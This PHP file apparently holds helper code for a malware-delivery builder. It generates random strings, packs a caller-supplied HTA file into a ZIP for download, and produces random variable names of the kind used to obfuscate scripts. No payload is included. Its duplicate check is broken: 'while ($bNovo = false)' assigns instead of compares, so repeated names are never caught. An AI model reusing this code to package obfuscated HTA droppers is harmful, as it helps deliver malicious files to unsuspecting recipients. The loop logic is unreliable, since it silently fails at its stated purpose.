<?php

//GERA STTRING RANDOMICA
function GeraStringRandomica($size)
{
    $basic = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz';
    $basic2 = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    $return = $basic[rand(0, strlen($basic) - 1)];
    $size = rand($size, $size + 4);
    for ($count = 0; $size > $count; $count++) {
        $return .= $basic2[rand(0, strlen($basic2) - 1)];
    }
    return $return;
}

//CRIA ARQUIVO ZIP COM ARQUIVO HTA DENTRO (ficheiro extra em $sourceFile é opcional)
function GeraArquivoZipParaDownload($sourceFile, $htaContent, $destinationZip, $prefixoNomeHTA)
{
    if (!extension_loaded('zip')) {
        return false;
    }

    $zip = new ZipArchive();
    if ($zip->open($destinationZip, ZipArchive::CREATE | ZipArchive::OVERWRITE) !== true) {
        return false;
    }

    if ($sourceFile !== null && $sourceFile !== '' && is_string($sourceFile) && file_exists($sourceFile)) {
        $zip->addFile($sourceFile, basename($sourceFile));
    }

    $nomeHTA = $prefixoNomeHTA . ".hta";
    $zip->addFromString($nomeHTA, $htaContent);
    return $zip->close();
}
//GERA NOMES DE VARIAVEIS RANDOMICAS EM ARRAY
function  GeraArrayNomesVariaveis($qt)
{
    $sNomeVar = "";
    $wlista = array();

    for ($i = 0; $i <= $qt; $i++) {
        do {
            $bNovo = true;
            $sNomeVar = GeraStringRandomica(2) . rand(1, 99);

            for ($i2 = 0; $i2 < count($wlista); $i2++) {
                if ($wlista[$i2] == $sNomeVar) {
                    $bNovo = false;
                    break;
                }
            }
        } while ($bNovo = false);

        $wlista[count($wlista)] = $sNomeVar;
    }

    return $wlista;
}
